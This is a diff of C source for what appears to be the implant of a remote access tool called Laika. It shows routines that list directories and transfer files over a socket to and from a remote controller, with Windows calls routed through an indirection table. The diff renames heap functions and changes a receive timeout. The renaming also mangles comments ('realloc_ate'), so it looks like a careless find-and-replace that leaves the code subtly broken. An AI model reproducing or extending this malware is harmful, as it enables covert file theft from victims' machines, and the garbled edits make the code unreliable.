@@ -72,7 +72,7 @@ char* get_file_list(const char* dirPath, int* numFiles) {
         // Add the file/folder name to the array
         if (numFound >= maxFiles) {
             maxFiles *= 2;
-            fileList = (char**)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, fileList, maxFiles * sizeof(char*));
+            fileList = (char**)Api.Heaprealloc_(_crt_heap, HEAP_ZERO_MEMORY, fileList, maxFiles * sizeof(char*));
         }
         fileList[numFound] = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, strlen(fileName) + 1);
         strcpy(fileList[numFound], fileName);
@@ -95,10 +95,10 @@ char* get_file_list(const char* dirPath, int* numFiles) {
         if (i < numFound - 1) {
             strcat(fileNames, "/");
         }
-        Api.HeapFree(_crt_heap, 0, fileList[i]);
+        Api.Heapfree_(_crt_heap, 0, fileList[i]);
     }
 
-    Api.HeapFree(_crt_heap, 0, fileList);
+    Api.Heapfree_(_crt_heap, 0, fileList);
 
     // Set the numFiles parameter to the number of files/folders found
     *numFiles = numFound;
@@ -186,7 +186,7 @@ int download_file(HANDLE fp, SOCKET sock) {
                     FD_SET(sock, &write_fds);
 
                     if (Api.select(sock + 1, NULL, &write_fds, NULL, NULL) == SOCKET_ERROR) {
-                        Api.HeapFree(_crt_heap, 0, data);
+                        Api.Heapfree_(_crt_heap, 0, data);
                         Api.CloseHandle(fp);
                         Sleep_(Sleep_TIME);
                         return 0;
@@ -194,7 +194,7 @@ int download_file(HANDLE fp, SOCKET sock) {
                 }
                 else {
 					Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
-                    Api.HeapFree(_crt_heap, 0, data);
+                    Api.Heapfree_(_crt_heap, 0, data);
                     Api.CloseHandle(fp);
                     Sleep_(Sleep_TIME);
                     return 0;
@@ -209,7 +209,7 @@ int download_file(HANDLE fp, SOCKET sock) {
 
 	Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
     Api.CloseHandle(fp);
-    Api.HeapFree(_crt_heap, 0, data);
+    Api.Heapfree_(_crt_heap, 0, data);
 
     return 1;
 }
@@ -239,7 +239,7 @@ void upload_file(SOCKET sock, HANDLE file_handle) {
     }
 
     // Close the file handle
-    Api.HeapFree(_crt_heap, 0, buffer);
+    Api.Heapfree_(_crt_heap, 0, buffer);
 
     return;
 }
@@ -253,7 +253,7 @@ char* upload_file_to_mem(SOCKET sock, size_t *total_bytes) {
     int num_bytes = 0;
     size_t buffer_capacity = BUFFER_SIZE;
 
-    int iOptVal = 5000;
+    int iOptVal = 500;
     int iOptLen = sizeof(int);
 
     Api.setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOptVal, iOptLen);
@@ -262,13 +262,13 @@ char* upload_file_to_mem(SOCKET sock, size_t *total_bytes) {
     while ((num_bytes = Api.recv(sock, buffer + *total_bytes, BUFFER_SIZE, 0)) > 0 || (num_bytes == -1 && Api.WSAGetLastError() == WSAEWOULDBLOCK)) {
         if (num_bytes > 0) {
             *total_bytes += num_bytes;
-            // Reallocate the buffer if necessary
+            // realloc_ate the buffer if necessary
             if (*total_bytes + BUFFER_SIZE > buffer_capacity) {
                 buffer_capacity *= 2;
-                char* new_buffer = (char*)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, buffer, buffer_capacity);
+                char* new_buffer = (char*)Api.Heaprealloc_(_crt_heap, HEAP_ZERO_MEMORY, buffer, buffer_capacity);
                 if (!new_buffer) {
-                    Api.HeapFree(_crt_heap, 0, buffer);
-                    return NULL; // Memory reallocation failed
+                    Api.Heapfree_(_crt_heap, 0, buffer);
+                    return NULL; // Memory realloc_ation failed
                 }
                 buffer = new_buffer;
             }
@@ -277,11 +277,11 @@ char* upload_file_to_mem(SOCKET sock, size_t *total_bytes) {
 
     buffer[*total_bytes] = '\0';
 
-    // Reallocate to the exact size of the received data
-    char* final_buffer = (char*)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, buffer, *total_bytes);
+    // realloc_ate to the exact size of the received data
+    char* final_buffer = (char*)Api.Heaprealloc_(_crt_heap, HEAP_ZERO_MEMORY, buffer, *total_bytes);
     if (!final_buffer) {
-        Api.HeapFree(_crt_heap, 0, buffer);
-        return NULL; // Memory reallocation failed
+        Api.Heapfree_(_crt_heap, 0, buffer);
+        return NULL; // Memory realloc_ation failed
     }
 
     return final_buffer;
